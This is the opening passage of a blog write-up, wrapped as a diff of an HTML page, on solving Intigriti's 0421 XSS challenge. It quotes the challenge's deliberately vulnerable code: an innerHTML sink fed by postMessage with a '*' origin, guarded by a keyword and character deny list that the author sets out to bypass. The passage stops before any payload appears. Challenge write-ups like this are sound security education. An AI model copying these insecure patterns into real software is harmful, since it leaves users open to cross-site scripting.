@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Solving Intigriti&#39;s 0421 XSS Challenge (Part 1) - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2021/05/25/en/xss-challenge-by-intigriti-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="IntroductionOne day, while browsing the internet, I came across an XSS challenge: Intigriti’s 0421 XSS challenge - by @terjanq. Apart from the challenge itself being very attractive, what attracted me">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Solving Intigriti&#39;s 0421 XSS Challenge (Part 1)">
+<meta property="og:url" content="https://blog.huli.tw/2021/05/25/en/xss-challenge-by-intigriti-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="IntroductionOne day, while browsing the internet, I came across an XSS challenge: Intigriti’s 0421 XSS challenge - by @terjanq. Apart from the challenge itself being very attractive, what attracted me">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-challenge-by-intigriti-writeup/cover-en.png">
+<meta property="article:published_time" content="2021-05-25T14:13:21.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.936Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Front-end">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/xss-challenge-by-intigriti-writeup/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Solving Intigriti&#39;s 0421 XSS Challenge (Part 1)" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#introduction">1&nbsp;&nbsp;<b>Introduction</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#challenge-content">2&nbsp;&nbsp;<b>Challenge Content</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#first-attempt">3&nbsp;&nbsp;<b>First Attempt</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#hints">4&nbsp;&nbsp;<b>Hints</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#solving-the-weakened-version">5&nbsp;&nbsp;<b>Solving the weakened version?</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#relying-on-hints-again">6&nbsp;&nbsp;<b>Relying on Hints Again</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#conclusion">7&nbsp;&nbsp;<b>Conclusion</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2021/05/25/xss-challenge-by-intigriti-writeup/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Solving Intigriti&#39;s 0421 XSS Challenge (Part 1)
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2021-05-25T14:13:21.000Z" itemprop="datePublished">25 May 2021</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <h2><span id="introduction">Introduction</span></h2><p>One day, while browsing the internet, I came across an XSS challenge: <a target="_blank" rel="noopener" href="https://challenge-0421.intigriti.io/">Intigriti’s 0421 XSS challenge - by @terjanq</a>. Apart from the challenge itself being very attractive, what attracted me more was the author who created it.</p>
+<p>Many of the security-related resources I found online that were more focused on front-end were maintained or contributed to by this author, such as <a target="_blank" rel="noopener" href="https://tinyxss.terjanq.me/">Tiny XSS Payloads</a> or the eye-opening <a target="_blank" rel="noopener" href="https://xsleaks.dev/">XS-Leaks Wiki</a>.</p>
+<p><a target="_blank" rel="noopener" href="https://www.intigriti.com/">Intigriti</a> seems to hold this kind of XSS challenge every month, and this was the hardest one they have ever held. The challenge lasted from 4&#x2F;19 to 4&#x2F;25, with a week to try, and only 15 people successfully solved it. In March, 45 people solved the challenge, and in February, 33 people did, so the number of people who solved it this time was indeed much less, indicating the difficulty of the challenge.</p>
+<p>I spent about five days on it, and every time I got stuck, I thought, “I should give up and wait for the answer.” But then, from time to time, new ideas would come up, and I would try again. Finally, on the last day before the deadline, I solved it before the time limit, and when I did, I clenched my fists and shouted, “Too awesome!”</p>
+<p>This article is about my experience in solving the challenge. I previously wrote an English version, but it was probably worse than an elementary school composition, so I decided to write a Chinese version to better express my thoughts. The title will have a “Part 1” because this article is about my solution, and the next article will be about the author’s solution, and the one after that will analyze other people’s solutions.</p>
+<p>But it seems that my blog is cursed to break the series of articles that haven’t been written yet, so I hope I can make it through this time.</p>
+<span id="more"></span>
+
+<h2><span id="challenge-content">Challenge Content</span></h2><p>The challenge is here: <a target="_blank" rel="noopener" href="https://challenge-0421.intigriti.io/">https://challenge-0421.intigriti.io/</a></p>
+<p>The goal is to successfully execute XSS on this website and execute <code>alert(&#39;flag&#123;THIS_IS_THE_FLAG&#125;&#39;)</code> to win.</p>
+<p>There are two web pages in this challenge. The first one is index.html, and I only captured the relevant code for the challenge below:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>wafIframe<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./waf.html<span class="token punctuation">"</span></span> <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>allow-scripts<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">const</span> wafIframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'wafIframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> identifier <span class="token operator">=</span> <span class="token function">getIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">function</span> <span class="token function">getIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      crypto<span class="token punctuation">.</span><span class="token function">getRandomValues</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">+</span> buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">htmlError</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> safe</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"error-content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">const</span> container <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"error-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      container<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"block"</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span><span class="token punctuation">(</span>safe<span class="token punctuation">)</span> div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> str<span class="token punctuation">;</span>
+      <span class="token keyword">else</span> div<span class="token punctuation">.</span>innerText <span class="token operator">=</span> str<span class="token punctuation">;</span>
+      window<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        container<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"none"</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">addError</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      wafIframe<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+          identifier<span class="token punctuation">,</span>
+          str
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'waf'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+          <span class="token keyword">if</span><span class="token punctuation">(</span>identifier <span class="token operator">!==</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>identifier<span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token operator">/</span>nice <span class="token keyword">try</span><span class="token operator">/</span>
+          <span class="token function">htmlError</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">,</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>safe<span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> error <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span><span class="token punctuation">(</span>error <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token function">addError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>First, when the window loads, the content of <code>error</code> is taken from the URL’s query string, and then <code>addError(error)</code> is called. Then, the content is added with a randomly generated ID and sent to <code>wafIframe</code> using postMessage.</p>
+<p>After <code>wafIframe</code> finishes processing, it sends the result back using postMessage. First, it checks whether the identifier is the same. If it is, the verification is passed, and then it checks whether <code>e.data.safe</code> is true. If it is, it uses innerHTML to add <code>e.data.str</code>, otherwise it uses innerText.</p>
+<p>Next, let’s take a look at what the other page, waf.html, is doing:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> identifier <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>identifier<span class="token punctuation">;</span>
+    e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'waf'</span><span class="token punctuation">,</span>
+        identifier<span class="token punctuation">,</span>
+        <span class="token literal-property property">str</span><span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">,</span>
+        <span class="token literal-property property">safe</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WAF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isSafe</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>str<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token constant">WAF</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> forbidden_words <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&lt;style'</span><span class="token punctuation">,</span> <span class="token string">'&lt;iframe'</span><span class="token punctuation">,</span> <span class="token string">'&lt;embed'</span><span class="token punctuation">,</span> <span class="token string">'&lt;form'</span><span class="token punctuation">,</span> <span class="token string">'&lt;input'</span><span class="token punctuation">,</span> <span class="token string">'&lt;button'</span><span class="token punctuation">,</span> <span class="token string">'&lt;svg'</span><span class="token punctuation">,</span> <span class="token string">'&lt;script'</span><span class="token punctuation">,</span> <span class="token string">'&lt;math'</span><span class="token punctuation">,</span> <span class="token string">'&lt;base'</span><span class="token punctuation">,</span> <span class="token string">'&lt;link'</span><span class="token punctuation">,</span> <span class="token string">'javascript:'</span><span class="token punctuation">,</span> <span class="token string">'data:'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> dangerous_operators <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">function</span> <span class="token function">decodeHTMLEntities</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">var</span> ta <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'textarea'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ta<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> str<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> ta<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">onlyASCII</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^\x21-\x7e]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">firstTag</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;[a-z]+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">firstOnHandler</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">on[a-z]&#123;3,&#125;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">firstEqual</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">=</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">hasDangerousOperators</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> dangerous_operators<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">op</span><span class="token operator">=></span>str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">hasForbiddenWord</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> forbidden_words<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">word</span><span class="token operator">=></span>str<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span> <span class="token string">'gi'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">isSafe</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> decoded <span class="token operator">=</span> <span class="token function">onlyASCII</span><span class="token punctuation">(</span><span class="token function">decodeHTMLEntities</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">const</span> first_tag <span class="token operator">=</span> <span class="token function">firstTag</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>first_tag <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        decoded <span class="token operator">=</span> decoded<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>first_tag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hasForbiddenWord</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">const</span> first_on_handler <span class="token operator">=</span> <span class="token function">firstOnHandler</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>first_on_handler <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        decoded <span class="token operator">=</span> decoded<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>first_on_handler<span class="token punctuation">)</span>
+
+        <span class="token keyword">const</span> first_equal <span class="token operator">=</span> <span class="token function">firstEqual</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>first_equal <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        decoded <span class="token operator">=</span> decoded<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>first_equal<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hasDangerousOperators</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When it receives data from index, it goes through a series of verifications to see if the data is safe. The verifications are done in the following order:</p>
+<ol>
+<li>First, the sent data is decoded and only ASCII is allowed.</li>
+<li>Find the first HTML tag and filter out <code>[&#39;&lt;style&#39;, &#39;&lt;iframe&#39;, &#39;&lt;embed&#39;, &#39;&lt;form&#39;, &#39;&lt;input&#39;, &#39;&lt;button&#39;, &#39;&lt;svg&#39;, &#39;&lt;script&#39;, &#39;&lt;math&#39;, &#39;&lt;base&#39;, &#39;&lt;link&#39;, &#39;javascript:&#39;, &#39;data:&#39;]</code>.</li>
+<li>Find the first &#x3D; sign that appears after the onXXX handler.</li>
+<li>Cannot have the following characters: <code>[&#39;&quot;&#39;, &quot;&#39;&quot;, &#39;``&#39;, &#39;(&#39;, &#39;)&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;, &#39;[&#39;, &#39;]&#39;, &#39;=&#39;]</code>.</li>
